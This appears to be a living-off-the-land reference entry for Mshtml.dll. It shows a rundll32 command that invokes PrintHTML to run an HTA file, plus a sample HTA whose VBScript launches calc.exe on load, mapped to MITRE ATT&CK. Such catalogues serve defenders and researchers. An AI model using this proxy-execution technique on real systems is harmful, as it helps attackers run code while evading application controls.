## Mshtml.dll

* Functions: Execute

```
rundll32.exe Mshtml.dll,PrintHTML "C:\temp\calc.hta"    
```

Acknowledgements:
* Pierre-Alexandre Braeken - @pabraeken

Code sample (calc.hta):
```
<html>
<head>
	<title>LOLBin</title>
	<script language="VBScript">
		Sub RunProgram
            Set objShell = CreateObject("Wscript.Shell")
            objShell.Run "c:\windows\system32\calc.exe"
			Self.Close
        End Sub
	</script>
</head>
<body onload="RunProgram">
    <h1>LOLBin</h1>
</body>
</html>
```

Resources:
* https://twitter.com/pabraeken/status/998567549670477824

Full path:
```
c:\windows\system32\Mshtml.dll
c:\windows\sysWOW64\Mshtml.dll
```

Notes:


Detection:
MITRE ATT&CK:
* [Rundll32](https://attack.mitre.org/wiki/Technique/T1085)
